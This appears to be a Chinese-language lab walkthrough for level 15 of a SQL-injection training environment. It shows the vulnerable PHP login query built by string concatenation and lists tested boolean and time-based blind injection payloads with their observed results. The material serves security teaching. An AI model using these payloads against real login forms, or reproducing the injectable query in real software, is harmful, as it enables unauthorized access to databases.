# Less-15

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · 盲注 |
| **闭合方式** | `'` |
| **成败信号** | flag.jpg / slap.jpg |
| **一句话** | 布尔 + 时间盲注 |
| **核心 payload** | `uname=admin' and length(database())=8--+` |

---

**POST · 布尔/时间盲注 · 单引号**

### 源码

```php
$sql = "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
if($row) { echo '<img src="../images/flag.jpg" />'; }
else     { echo '<img src="../images/slap.jpg" />'; }
```

结构跟 Less-11 一模一样，区别还是**回显被注释掉了**。

### 通关 payload（实测）

**布尔盲注**
```
uname = admin' --+                            →  flag.jpg
uname = admin' and 1=2--+                     →  slap.jpg
uname = admin' and length(database())=8--+    →  flag.jpg  （真）
uname = admin' and length(database())=9--+    →  slap.jpg  （假）
```

**时间盲注**
```
uname = admin' and sleep(3)--+   →  3280ms（正常 240ms）✓ 注入成功
```

---

[← Less-14](Less-14.md) ｜ [返回目录](README.md) ｜ [Less-16 →](Less-16.md)